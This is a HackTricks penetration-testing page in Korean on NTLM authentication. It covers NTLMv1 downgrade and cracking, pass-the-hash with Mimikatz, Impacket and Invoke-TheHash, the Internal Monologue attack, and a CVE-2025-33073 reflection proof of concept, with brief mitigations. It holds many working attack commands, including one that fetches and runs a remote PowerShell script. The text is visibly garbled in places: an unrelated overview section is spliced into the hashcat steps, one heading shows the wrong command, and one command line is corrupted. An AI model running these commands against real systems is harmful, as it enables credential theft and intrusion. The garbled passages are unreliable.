# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

**Windows XP 및 Server 2003**가 사용되는 환경에서는 LM (Lan Manager) 해시가 사용되지만, 이는 쉽게 compromised될 수 있는 것으로 널리 알려져 있습니다. 특정 LM hash `AAD3B435B51404EEAAD3B435B51404EE`는 LM이 사용되지 않음을 나타내며, 빈 문자열의 hash를 의미합니다.

기본적으로 **Kerberos** authentication protocol이 주요하게 사용됩니다. NTLM (NT LAN Manager)은 특정 상황에서 동작합니다: Active Directory 부재, domain이 존재하지 않음, 잘못된 configuration으로 인해 Kerberos가 작동하지 않음, 또는 유효한 hostname 대신 IP address로 connection을 시도하는 경우입니다.

네트워크 packet에 **"NTLMSSP"** header가 존재하면 NTLM authentication process가 진행 중임을 의미합니다.

LM, NTLMv1, NTLMv2 authentication protocol에 대한 지원은 `%windir%\Windows\System32\msv1\_0.dll`에 위치한 특정 DLL에 의해 제공됩니다.

**Key Points**:

- LM hashes는 취약하며, 빈 LM hash(`AAD3B435B51404EEAAD3B435B51404EE`)는 사용되지 않음을 의미합니다.
- Kerberos는 기본 authentication method이며, NTLM은 특정 조건에서만 사용됩니다.
- NTLM authentication packet은 "NTLMSSP" header로 식별할 수 있습니다.
- LM, NTLMv1, NTLMv2 protocol은 시스템 파일 `msv1\_0.dll`이 지원합니다.

## LM, NTLMv1 and NTLMv2

어떤 protocol이 사용될지 확인하고 configure할 수 있습니다:

### GUI

_secpol.msc_ 실행 -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. 6개 level이 있습니다 (0부터 5까지).

![](<../../images/image (919).png>)

### Registry

이것은 level 5를 설정합니다:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
가능한 값:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM Domain authentication Scheme

1. **user**가 **credentials**를 입력한다
2. 클라이언트 머신이 **domain name**과 **username**을 보내며 **authentication request**를 전송한다
3. **server**가 **challenge**를 보낸다
4. **client**가 **password hash**를 key로 사용해 **challenge**를 **encrypts**하고 이를 response로 보낸다
5. **server**가 **domain controller**에 **domain name, username, challenge, response**를 보낸다. Active Directory가 구성되어 **있지 않거나** domain name이 서버 이름인 경우, credentials는 **local로 확인**된다.
6. **domain controller**가 모든 것이 올바른지 확인하고 그 정보를 서버에 보낸다

**server**와 **Domain Controller**는 **Netlogon** server를 통해 **Secure Channel**을 만들 수 있는데, 이는 Domain Controller가 서버의 password를 알고 있기 때문이다(그 password는 **NTDS.DIT** db 안에 있다).

### Local NTLM authentication Scheme

authentication은 **앞에서 언급한 것과 같지만**, **server**가 **SAM** file 안에 authenticate하려는 user의 **hash**를 알고 있다. 따라서 Domain Controller에 묻는 대신, **server가 직접** 해당 user가 authenticate할 수 있는지 확인한다.

### NTLMv1 Challenge

**challenge length**는 8 bytes이고 **response**는 24 bytes 길이다.

**hash NT (16bytes)**는 **3 parts of 7bytes each**로 나뉜다(7B + 7B + (2B+0x00\*5)): **마지막 part는 zeros로 채워진다**. 그런 다음 **challenge**를 각 part로 **separately** cipher하고, 그 결과의 ciphered bytes를 **joined**한다. Total: 8B + 8B + 8B = 24Bytes.

**Problems**:

- **randomness** 부족
- 3개의 part를 **separately** 공격해서 NT hash를 찾을 수 있다
- **DES is crackable**
- 3번째 key는 항상 **5 zeros**로 구성된다.
- **same challenge**가 주어지면 **response**도 **same**이 된다. 따라서 피해자에게 **challenge**로 문자열 "**1122334455667788**"을 주고, 미리 계산된 rainbow tables를 사용해 response를 공격할 수 있다.

### NTLMv1 attack

요즘은 Unconstrained Delegation이 구성된 환경을 찾기 점점 덜 흔하지만, 그렇다고 해서 구성된 **Print Spooler service**를 **abuse**할 수 없다는 뜻은 아니다.

이미 AD에서 가지고 있는 credentials/sessions를 **abuse**해서 프린터가 **당신이 제어하는 host**에 authenticate하도록 요청할 수 있다. 그런 다음 `metasploit auxiliary/server/capture/smb` 또는 `responder`를 사용해 **authentication challenge를 1122334455667788로 설정**하고 authentication 시도를 캡처할 수 있으며, 그것이 **NTLMv1**로 수행되었다면 **crack**할 수 있다.\
`responder`를 사용하는 경우 **flag `--lm`**을 사용해 **authentication**을 **downgrade**해 볼 수 있다.\
_Note that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._

프린터는 authentication 중에 computer account를 사용하며, computer account는 **길고 랜덤한 password**를 사용하므로 일반적인 **dictionaries**로는 **crack**하지 못할 가능성이 높다. 하지만 **NTLMv1** authentication은 **DES**를 사용하므로([more info here](#ntlmv1-challenge)), DES cracking에 특화된 서비스를 사용하면 이를 crack할 수 있다(예를 들어 [https://crack.sh/](https://crack.sh) 또는 [https://ntlmv1.com/](https://ntlmv1.com) 사용 가능).

### NTLMv1 attack with hashcat

NTLMv1은 NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi)로도 깨뜨릴 수 있는데, 이 도구는 hashcat으로 깨질 수 있는 방식으로 NTLMv1 messages를 포맷한다.

The command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
다음이 출력됩니다:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Create a file with the contents of:
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
hashcat을 실행하세요(하스톱올리스(hashtopolis) 같은 도구를 통해 분산 실행하는 것이 가장 좋습니다). 그렇지 않으면 이 작업은 며칠이 걸릴 수 있습니다.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
이 경우 이 계정의 비밀번호가 password라는 것을 알고 있으므로, 데모 목적상 이를 이용하겠습니다:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
이제 cracked 된 des keys를 NTLM hash의 일부로 변환하기 위해 hashcat-utilities를 사용해야 합니다:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
마지막 부분입니다:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
# NTLM

NTLM은 Windows 환경에서 오랫동안 사용되어 온 인증 프로토콜이다. 공격 표면이 넓고, 특히 잘못된 구성이나 레거시 지원으로 인해 여전히 많은 환경에서 발견된다.

## 개요

NTLM은 `challenge-response` 메커니즘을 사용한다. 서버는 `challenge`를 보내고, 클라이언트는 비밀번호에서 파생된 값으로 응답한다. 이 과정에서 비밀번호 자체는 전송되지 않지만, 여러 종류의 공격에 취약할 수 있다.

## 자주 보이는 공격 기법

- **NTLM Relay**: 인증 응답을 다른 서비스로 중계하여 권한을 획득하는 기법.
- **NTLM Hash Dumping**: 메모리나 시스템에서 NTLM hash를 추출하는 기법.
- **Pass-the-Hash**: NTLM hash를 사용해 실제 비밀번호 없이 인증하는 기법.
- **Coercion**: 시스템이 강제로 인증을 수행하도록 유도하는 기법.

## 방어 방법

- NTLM 사용을 최소화하고, 가능하면 Kerberos를 사용한다.
- SMB signing, LDAP signing, EPA 등 관련 보호 기능을 활성화한다.
- 관리자 권한 계정의 사용을 제한하고, 로컬 관리자 비밀번호를 고유하게 관리한다.
- 레거시 프로토콜과 불필요한 원격 인증을 비활성화한다.

## 참고

NTLM은 특히 내부 네트워크에서 여전히 중요하다. 환경에 따라 `relay`, `hash reuse`, 인증 강제 유도 같은 기법이 실제 침해로 이어질 수 있으므로, 보호 설정을 점검하는 것이 중요하다.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**challenge length는 8 bytes**이고 **2개의 responses**가 전송된다: 하나는 **24 bytes** 길이이고, **다른** 하나의 길이는 **variable**이다.

**첫 번째 response**는 **client와 domain**으로 구성된 **string**을 **HMAC_MD5**로 암호화하고, **key**로는 **NT hash**의 **hash MD4**를 사용해 생성된다. 그런 다음 **result**를 **key**로 사용해 **challenge**를 **HMAC_MD5**로 암호화한다. 여기에 **8 bytes의 client challenge**가 추가된다. 총합: 24 B.

**두 번째 response**는 **여러 값들**(새로운 client challenge, **timestamp**로 **replay attacks** 방지...)을 사용해 생성된다.

만약 **성공적인 authentication process**가 캡처된 **pcap**이 있다면, 이 가이드를 따라 domain, username, challenge, response를 얻고 password를 크랙해 볼 수 있다: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**victim의 hash를 얻었다면**, 이를 사용해 **impersonate**할 수 있다.\
**NTLM authentication을 그 hash로 수행하는** **tool**을 사용해야 하며, **또는** 새 **sessionlogon**을 만들고 그 hash를 **LSASS** 안에 **inject**할 수도 있다. 그러면 어떤 **NTLM authentication**이 수행되든, 그 **hash**가 사용된다. 마지막 옵션이 바로 mimikatz가 하는 방식이다.

**Computer accounts를 사용해서도 Pass-the-Hash attacks를 수행할 수 있다는 점을 기억하라.**

### **Mimikatz**

**administrator 권한으로 실행해야 한다**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
This will launch a process that will belongs to the users that have launch mimikatz but internally in LSASS the saved credentials are the ones inside the mimikatz parameters. Then, you can access to network resources as if you where that user (similar to the `runas /netonly` trick but you don't need to know the plain-text password).

### Pass-the-Hash from linux

Windows 머신에서 Linux를 사용해 Pass-the-Hash로 code execution을 얻을 수 있습니다.\
[**Access here to learn how to do it.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

[Windows용 impacket 바이너리](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)를 여기서 다운로드할 수 있습니다.

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (이 경우 command를 지정해야 하며, cmd.exe와 powershell.exe는 interactive shell을 얻기 위해 유효하지 않습니다)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- 그 외에도 여러 Impacket 바이너리가 있습니다...

### Invoke-TheHash

powershell scripts는 여기서 받을 수 있습니다: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

이 함수는 **다른 것들의 혼합**이다. **여러 호스트**를 넘길 수 있고, 일부를 **제외**할 수 있으며, 사용하고 싶은 **옵션**을 **선택**할 수 있다(_SMBExec, WMIExec, SMBClient, SMBEnum_). **SMBExec**와 **WMIExec** 중 **어느 것**을 선택하든 _**Command**_ 파라미터를 **주지 않으면**, **권한이 충분한지**만 **확인**한다.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**관리자 권한으로 실행해야 함**

이 도구는 mimikatz와 같은 작업을 수행합니다(LSASS 메모리 수정).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### 사용자 이름과 비밀번호로 수동 Windows 원격 실행


{{#ref}}
../lateral-movement/
{{#endref}}

## Windows Host에서 credential 추출

**Windows host에서 credentials를 얻는 방법에 대한 더 자세한 정보는** [**이 페이지를 읽어보세요**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

Internal Monologue Attack은 공격자가 **LSASS process와 직접 상호작용하지 않고도** 피해자 machine에서 NTLM hashes를 가져올 수 있게 해주는 은밀한 credential 추출 technique입니다. 메모리에서 hashes를 직접 읽는 Mimikatz와 달리, 이 attack은 **Security Support Provider Interface (SSPI)를 통해 NTLM authentication package (MSV1_0)에 대한 local calls**를 활용합니다. 공격자는 먼저 **NTLM settings**(예: LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic)를 낮춰 NetNTLMv1이 허용되도록 합니다. 그런 다음 실행 중인 processes에서 얻은 기존 user tokens를 가장하고, 알려진 challenge를 사용해 NetNTLMv1 responses를 생성하도록 local에서 NTLM authentication을 트리거합니다.

이 NetNTLMv1 responses를 캡처한 뒤, 공격자는 **미리 계산된 rainbow tables**를 사용해 원래 NTLM hashes를 빠르게 복구할 수 있으며, 이를 통해 lateral movement를 위한 추가 Pass-the-Hash attacks가 가능해집니다. 핵심적으로 Internal Monologue Attack은 network traffic을 생성하지 않고, code를 inject하지 않으며, 직접적인 memory dumps도 트리거하지 않기 때문에 은밀성이 유지됩니다. 따라서 Mimikatz 같은 전통적인 methods보다 방어자가 탐지하기 더 어렵습니다.

NetNTLMv1이 보안 정책 강제 등으로 허용되지 않으면, 공격자는 NetNTLMv1 response를 가져오지 못할 수 있습니다.

이 경우를 처리하기 위해 Internal Monologue tool이 업데이트되었습니다. `AcceptSecurityContext()`를 사용해 server token을 동적으로 획득하여, NetNTLMv1이 실패해도 계속 **NetNTLMv2 responses를 캡처**할 수 있습니다. NetNTLMv2는 훨씬 더 크랙하기 어렵지만, 제한된 경우에는 relay attacks나 offline brute-force로 이어질 수 있습니다.

PoC는 **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** 에서 찾을 수 있습니다.

## NTLM Relay and Responder

**이러한 attacks를 수행하는 방법에 대한 더 자세한 가이드는 여기에서 읽어보세요:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## 네트워크 캡처에서 NTLM challenges 파싱

**다음을 사용할 수 있습니다** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## Serialized SPNs를 통한 NTLM & Kerberos *Reflection* (CVE-2025-33073)

Windows에는 NTLM (또는 Kerberos) authentication이 host에서 시작되어 **같은** host로 다시 relay되어 SYSTEM privileges를 얻는 *reflection* attacks를 막기 위한 여러 mitigations가 포함되어 있습니다.

Microsoft는 MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) 및 이후 패치로 대부분의 public chains를 막았지만, **CVE-2025-33073**는 **SMB client가 marshalled (serialized) target-info를 포함한 Service Principal Names (SPNs)를 잘라내는 방식**을 악용하면 보호를 우회할 수 있음을 보여줍니다.

### 버그의 TL;DR
1. 공격자가 marshalled SPN을 인코딩한 레이블을 가진 **DNS A-record**를 등록합니다. 예:
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. 피해자가 해당 hostname으로 인증하도록 강제됩니다 (PetitPotam, DFSCoerce 등).
3. SMB client가 target string `cifs/srv11UWhRCAAAAA…`를 `lsasrv!LsapCheckMarshalledTargetInfo`에 전달할 때, `CredUnmarshalTargetInfo` 호출이 serialized blob을 **제거**하여 **`cifs/srv1`**만 남깁니다.
4. `msv1_0!SspIsTargetLocalhost` (또는 Kerberos에 해당하는 함수)는 이제 짧은 host 부분이 computer name(`SRV1`)과 일치하므로 target을 *localhost*로 간주합니다.
5. 그 결과 server는 `NTLMSSP_NEGOTIATE_LOCAL_CALL`을 설정하고 **LSASS의 SYSTEM access-token**을 context에 주입합니다 (Kerberos의 경우 SYSTEM이 표시된 subsession key가 생성됩니다).
6. `ntlmrelayx.py` **또는** `krbrelayx.py`로 해당 authentication을 relaying하면 같은 host에서 전체 SYSTEM 권한을 얻습니다.

### 빠른 PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* KB patch for **CVE-2025-33073** adds a check in `mrxsmb.sys::SmbCeCreateSrvCall` that blocks any SMB connection whose target contains marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
* **SMB signing**을 강제해 패치되지 않은 호스트에서도 reflection을 방지한다.
* `*<base64>...*`처럼 보이는 DNS 레코드를 모니터링하고 coercion 벡터(PetitPotam, DFSCoerce, AuthIP...)를 차단한다.

### Detection ideas
* 클라이언트 IP ≠ 서버 IP인 `NTLMSSP_NEGOTIATE_LOCAL_CALL`이 포함된 네트워크 캡처.
* subsession key를 포함하고 client principal이 hostname과 같은 Kerberos AP-REQ.
* 같은 호스트에서 바로 이어서 발생하는 원격 SMB writes가 뒤따르는 Windows Event 4624/4648 SYSTEM logons.

**March 2026** local reflection variant로, `SMB arbitrary ports`와 `TCP connection reuse`를 악용해 `NT AUTHORITY\SYSTEM`에 도달하는 방법은 다음을 참고:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
